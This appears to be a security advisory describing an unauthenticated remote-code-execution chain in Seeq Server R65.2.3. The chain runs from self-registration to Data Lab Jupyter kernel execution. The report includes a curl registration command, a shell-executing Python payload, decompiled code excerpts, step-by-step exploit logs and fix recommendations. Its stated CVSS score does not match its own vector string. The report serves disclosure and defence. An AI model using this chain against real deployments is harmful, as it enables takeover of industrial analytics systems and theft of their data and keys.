# Seeq Server R65.2.3 — Unauthenticated Self-Registration + Data Lab Jupyter Missing Authorization → Arbitrary Python RCE

## 1. Overview

Seeq Server is a closed-source industrial analytics platform used by manufacturers, energy companies, and process industries to analyze time-series process data. The platform exposes a REST API and web UI behind an nginx reverse proxy, and its Data Lab component provides Jupyter notebooks for advanced analytics. On a default R65.2.3 deployment (Data Lab installed via the official CLI), an unauthenticated remote attacker can obtain arbitrary command execution as the `datalab` user (uid 9500) by chaining two independent authorization flaws: open self-registration and missing administrator checks in the Data Lab orchestrator.

The chain requires no credentials, no MITM, and no prior foothold. It was verified end-to-end with a reproducible, standard-library-only exploit script, and independently re-confirmed by two adversarial subagents.

## 2. Vulnerability Summary

- **Type**: Unauthenticated RCE (authentication-bypass chain)
- **Root cause 1 (CWE-306)**: `Features/UserRegistration/Enabled=true` by default; `POST /api/users` is excluded from the nginx `auth_request` gate, so an anonymous request creates a valid user.
- **Root cause 2 (CWE-862)**: The Data Lab orchestrator (`getAuthorizedProjectData`) validates only project membership, not the administrator role; any authenticated user can schedule a Jupyter container.
- **Root cause 3 (CWE-78)**: The Jupyter kernel executes arbitrary Python with no sandbox, including `subprocess.run(cmd, shell=True)`.
- **Result**: Anonymous attacker → self-registered non-admin user → Data Lab Jupyter container → arbitrary OS command execution as `datalab` (uid 9500). CVSS 9.8.

## 3. Authentication Boundary

Seeq Server R65.2.3 uses Seeq Directory as the identity provider (`SeeqDirectory/Enabled=true`). The nginx reverse proxy enforces `auth_request /api/auth/validate` on most API paths, requiring a valid `sq-auth` cookie plus an `x-sq-csrf` header. The API also enforces the custom vendor content types: requests must send `Accept: application/vnd.seeq.v1+json` (otherwise HTTP 406) and `Content-Type: application/vnd.seeq.v1+json` (plain `application/json` returns 415).

Three paths are exempt from `auth_request`: `POST /api/users`, `/api/auth/providers`, and `/api/system/server-status`. The unauthenticated `GET /api/system/server-status` returns configuration data including `Features/UserRegistration/Enabled: true` and `isDataLabAvailable: true`, confirming both preconditions of the chain.

The Data Lab path (`/data-lab/<projectUuid>/...`) is proxied by nginx to the orchestrator container without an administrator restriction (unlike `/api/admin` routes). The orchestrator's own check, `UserManager.getAuthorizedProjectData(authToken, projectUuid)`, calls `getUserData` (rejects 401 without a session) and `getProjectData` (rejects 403 without project access) — but it never verifies the administrator role.

## 4. Attack Surface

- **Entry**: `POST /api/users` (unauthenticated self-registration)
- **Auth bootstrap**: `POST /api/auth/login` with the registered credentials (providerId=Seeq)
- **Project creation**: `POST /api/projects` (authenticated, any user)
- **Container scheduling**: `GET /data-lab/<projectUuid>/api/status` triggers `ProjectManager.getContainer → createContainer → DockerContainerCommon`, spawning `seeq/datalab-jupyter`
- **Kernel**: `POST /data-lab/<projectUuid>/api/kernels` creates a `python3` kernel
- **Execution sink**: WebSocket `/data-lab/<projectUuid>/api/kernels/<kernelId>/channels` accepts Jupyter `execute_request` messages with arbitrary `content.code`

All components listen behind the public-facing nginx endpoint (in the test deployment, port 34451, firewalled to localhost for research safety).

## 5. Sink Identification

The execution sink is the Jupyter kernel. The kernel container (`seeq/datalab-jupyter`) runs with `User: config.host_user` (uid 9500, the `datalab` account) and launches a standard Jupyter Server (Tornado). The kernel WebSocket accepts an `execute_request` message whose `content.code` field is executed as Python with no sandbox or capability restriction:

```python
# executed inside the kernel via execute_request.content.code
import subprocess
subprocess.run("id", shell=True)
```

Supporting sink code from the orchestrator (`/home/node/DockerContainerCommon.js`):

```javascript
getContainerParameters() {
    return {
        User: config.host_user.toString(),       // 9500 (datalab)
        GroupAdd: [config.host_group.toString()],
        Image: 'seeq/datalab-jupyter',
        HostConfig: { Binds: ['/home/datalab:...', '/seeq/keys:...', ...] },
    };
}
```

## 6. Source Identification & Controllability

The attacker controls every stage of the chain:

- **Registration body**: username, password, email, `isAdmin` flag on `POST /api/users` (no authentication header required)
- **Project body**: name and description on `POST /api/projects`
- **Kernel code**: arbitrary Python in the WebSocket `execute_request.content.code`

Server-side source handling is permissive by design:

```java
// UserPolicyV1.checkAuthorizedToCreate (CFR decompiled)
void checkAuthorizedToCreate(boolean userRegistrationEnabled, boolean seeqDirectoryEnabled, ...) {
    if (!(userRegistrationEnabled || ...)) {
        throw new ForbiddenException(...);   // true → no exception
    }
}
```

```java
// UserQueriesV1.createUser(@Nullable User currentUser, ...)
// currentUser may be null (unauthenticated); new User(...) calls:
this.setAdmin(this.checkIsFirstRegisteredUser());
// checkIsFirstRegisteredUser: reads systemState "First Admin Created";
// null → sets TRUE and returns true (first non-reserved registrant becomes admin)
```

No input sanitization is applied to the registration payload, project payload, or kernel code; the latter is executed verbatim.

## 7. Data Flow

```
Attacker (no credentials)
  │
  ├─1. POST /api/users          (no auth header, UserRegistration/Enabled=true)
  │      → checkAuthorizedToCreate(true,...) → no exception
  │      → createUser(currentUser=null) → 201 Created
  │
  ├─2. POST /api/auth/login     {username,password,providerId:Seeq}
  │      → 200 + Set-Cookie sq-auth + x-sq-csrf header
  │
  ├─3. POST /api/projects       (authenticated)
  │      → 201 + projectUuid (projectType=DATA_LAB, owner=current user)
  │
  ├─4. GET /data-lab/<uuid>/api/status   (cookie + csrf)
  │      → nginx /data-lab block (no admin restriction)
  │      → getAuthorizedProjectData → 401/403 checks only → OK
  │      → getContainer → createContainer → spawn seeq/datalab-jupyter (uid 9500)
  │
  ├─5. POST /data-lab/<uuid>/api/kernels {name: python3}
  │      → 201 + kernelId
  │
  └─6. WS /data-lab/<uuid>/api/kernels/<kernelId>/channels
         → orchestrator onUpgrade → dataLabProxy.upgrade → Jupyter container
         → execute_request {content.code: arbitrary Python}
         → kernel executes subprocess.run(cmd, shell=True)
         → RCE as datalab (uid 9500)
```

## 8. Exploit Construction

The exploit is a pure-stdlib Python script that drives all six stages automatically:

1. Self-register a random user (`rce_<hex>`) via `POST /api/users` with no authentication header.
2. Log in to obtain the `sq-auth` cookie and `x-sq-csrf` token.
3. Create a Data Lab project (`projectType=DATA_LAB`).
4. Trigger container scheduling via `/data-lab/<uuid>/api/status` (200 confirms the Jupyter container is up).
5. Create a `python3` Jupyter kernel.
6. Open the kernel WebSocket and send `execute_request` with `content.code = "import subprocess; subprocess.run('<cmd>', shell=True)"`; read the command output from `execute_reply`.

Manual reproduction steps (registration only):

```bash
curl -X POST -H "Content-Type: application/vnd.seeq.v1+json" \
  -d '{"username":"attacker","firstName":"A","lastName":"B","email":"a@b.c","name":"A B","password":"Attacker123!","isAdmin":false,"datasourceClass":"Auth","datasourceId":"Seeq"}' \
  http://<target>:34451/api/users
```

## 9. Dynamic Verification

End-to-end exploit run (target `127.0.0.1:34451`, command `id`):

```
[*] step 1: unauth self-registration
[+] self-registered user 'rce_5c10ea31' (unauth, CWE-306)
[*] step 2: login
[+] logged in as 'rce_5c10ea31' isAdmin=False
[*] step 3: create Data Lab project
[+] created Data Lab project 0F1941DE-ED51-7360-A6C1-BCD2BD948BF8 (projectType=DATA_LAB)
[*] step 4: spawn Data Lab Jupyter container
[+] Data Lab Jupyter container is up (status 200)
[*] step 5: create Jupyter kernel
[+] created Jupyter kernel 28360d88-f4ba-484c-852b-41179e0befa1
[*] step 6: execute command via Jupyter kernel websocket -> RCE

========== COMMAND OUTPUT (RCE as datalab uid 9500) ==========
uid=9500(datalab) gid=9500(users) groups=9500(users)
=============================================================
```

Two-path marker verification: the kernel stdout returned `SEEQ_RCE_df8771e67e44` + `uid=9500(datalab)` + hostname, and an independent `docker exec` read-back of `/tmp/seeq_rce_proof.txt` from outside the container returned the identical marker values. Additional commands (`whoami; hostname; head -3 /etc/passwd`) confirmed `datalab` / `c9be1d23270c`.

An independent re-analysis agent repeated the chain with a fresh user (`indep_verify_1786300394`, isAdmin=False) and obtained a unique fresh marker (`INDEP_RCE_dedca15e9e28`) with matching `uid=9500(datalab)` and container hostname, ruling out a one-time artifact.

## 10. Reachability & Impact

- **Reachability**: the entry point is fully unauthenticated; every subsequent stage requires only the attacker-created account. No MITM or on-host access is required.
- **Impact**: arbitrary OS command execution as `datalab` (uid 9500) inside the Jupyter container. The container mounts `/home/datalab`, `/seeq/keys`, and related volumes, exposing analytics data and platform keys. On typical Seeq deployments this enables theft of process analytics, manipulation of notebooks/models, and lateral movement into the Data Lab runtime.
- **Scope**: industrial analytics deployments across manufacturing, energy, and process industries.

## 11. Fix Recommendations

1. Set `Features/UserRegistration/Enabled=false` by default, or route self-registration through administrator approval.
2. Remove the first-registered-user auto-admin behavior; require explicit administrator credential configuration at install time.
3. Add an administrator-role check to `getAuthorizedProjectData()` and restrict Data Lab container/kernel scheduling to administrators.
4. Run Jupyter kernels in a sandboxed runtime that blocks `subprocess`/`os.system` or restricts file-system and network access.
5. Add server-side validation and rate limiting to `POST /api/users` to slow credential stuffing against self-registration.

## 12. CWE & CVSS

- **CWE-306**: Missing Authentication for Critical Function (unauthenticated self-registration)
- **CWE-862**: Missing Authorization (Data Lab scheduling without admin check)
- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command (arbitrary Python/kernel execution)
- **CVSS**: 9.8 Critical — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
